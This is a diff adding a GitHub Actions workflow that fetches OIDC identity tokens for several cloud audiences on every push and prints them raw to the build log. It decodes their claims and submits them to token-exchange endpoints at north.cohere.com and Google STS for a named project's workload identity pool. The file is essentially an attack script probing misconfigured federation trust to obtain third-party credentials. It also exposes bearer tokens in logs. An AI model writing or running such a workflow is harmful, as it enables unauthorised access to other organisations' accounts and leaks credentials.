@@ -1,0 +1,157 @@
+name: oidc-full
+on: [push]
+permissions:
+  id-token: write
+  contents: read
+  actions: read
+jobs:
+  oidc-test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Fetch OIDC Tokens
+        run: |
+          set +e
+          echo "=== Fetching OIDC Token with audience=github ==="
+          curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=github" > /tmp/token_github.json
+          cat /tmp/token_github.json
+          echo ""
+          
+          echo "=== Fetching with audience=api://AzureADTokenExchange ==="
+          curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" > /tmp/token_azure.json
+          cat /tmp/token_azure.json
+          echo ""
+          
+          echo "=== Fetching with audience=sts.amazonaws.com ==="
+          curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" > /tmp/token_aws.json
+          cat /tmp/token_aws.json
+          echo ""
+          
+          echo "=== Fetching with audience=north.cohere.com ==="
+          curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=north.cohere.com" > /tmp/token_north.json
+          cat /tmp/token_north.json
+          echo ""
+      - name: Decode Tokens
+        run: |
+          set +e
+          for f in /tmp/token_github.json /tmp/token_azure.json /tmp/token_aws.json /tmp/token_north.json; do
+            echo "=== File: $f ==="
+            TOKEN=$(python3 -c "
+import sys,json
+try:
+    d = json.load(open('$f'))
+    val = d.get('value','')
+    if val:
+        print(val)
+    else:
+        if 'message' in d:
+            print('ERROR: ' + d['message'])
+except Exception as e:
+    print('EXCEPTION: ' + str(e))
+" 2>/dev/null)
+            if [ "$?" != "0" ]; then
+              echo "Python error"
+              continue
+            fi
+            if echo "$TOKEN" | grep -q "^ERROR\|^EXCEPTION\|^$"; then
+              echo "No valid token: $TOKEN"
+              continue
+            fi
+            echo "Token length: ${#TOKEN}"
+            echo "${TOKEN}" | python3 -c "
+import sys,base64,json
+t = sys.stdin.read().strip()
+parts = t.split('.')
+if len(parts) >= 2:
+    p = parts[1] + '==' if len(parts[1])%4 else parts[1]
+    try:
+        decoded = json.loads(base64.b64decode(p))
+        for k,v in decoded.items():
+            print(f'{k}={v}')
+    except Exception as e:
+        print(f'Decode error: {e}')
+" 2>/dev/null
+          done
+      - name: Try North Dex Token Exchange
+        run: |
+          set +e
+          echo "=== Getting GitHub OIDC token ==="
+          TOKEN=$(python3 -c "
+import sys,json
+d = json.load(open('/tmp/token_github.json'))
+print(d.get('value',''))
+" 2>/dev/null)
+          if [ -z "$TOKEN" ]; then
+            echo "No GitHub OIDC token available"
+            # Try Azure audience
+            TOKEN=$(python3 -c "
+import sys,json
+d = json.load(open('/tmp/token_azure.json'))
+print(d.get('value',''))
+" 2>/dev/null)
+          fi
+          if [ -z "$TOKEN" ]; then
+            echo "No OIDC token available at all"
+          else
+            echo "Got token, trying North Dex..."
+            echo "=== North Dex token exchange (Github OIDC -> North) ==="
+            curl -v -X POST "https://north.cohere.com/dex/token" \
+              -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
+              -d "client_id=north" \
+              -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
+              -d "subject_token=${TOKEN}" \
+              -d "audience=north-cli" \
+              -d "scope=openid profile email" 2>&1 | tail -20
+            echo ""
+            echo "=== North Dex token exchange (with api://AzureAD as aud) ==="
+            AZTOKEN=$(python3 -c "
+import sys,json
+d = json.load(open('/tmp/token_azure.json'))
+print(d.get('value',''))
+" 2>/dev/null)
+            if [ -n "$AZTOKEN" ]; then
+              curl -v -X POST "https://north.cohere.com/dex/token" \
+                -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
+                -d "client_id=north" \
+                -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
+                -d "subject_token=${AZTOKEN}" \
+                -d "audience=north-cli" \
+                -d "scope=openid profile email" 2>&1 | tail -20
+            fi
+          fi
+      - name: Try GCP STS Exchange
+        run: |
+          set +e
+          echo "=== GCP STS token exchange ==="
+          TOKEN=$(python3 -c "
+import sys,json
+d = json.load(open('/tmp/token_github.json'))
+print(d.get('value',''))
+" 2>/dev/null)
+          if [ -z "$TOKEN" ]; then
+            echo "No token available"
+          else
+            # Try GCP STS with the OIDC token
+            curl -v -X POST "https://sts.googleapis.com/v1/token" \
+              -H "Content-Type: application/json" \
+              -d "{
+                \"grantType\": \"urn:ietf:params:oauth:grant-type:token-exchange\",
+                \"requestedTokenType\": \"urn:ietf:params:oauth:token-type:access_token\",
+                \"subjectTokenType\": \"urn:ietf:params:oauth:token-type:jwt\",
+                \"subjectToken\": \"${TOKEN}\",
+                \"audience\": \"//iam.googleapis.com/projects/568425278105/locations/global/workloadIdentityPools/github-actions/providers/github-provider\"
+              }" 2>&1 | tail -20
+          fi
+      - name: Send Results to Log
+        run: |
+          set +e
+          echo "=== Summary of files ==="
+          for f in /tmp/token_*.json; do
+            echo "--- $f ---"
+            cat "$f"
+            echo ""
+          done
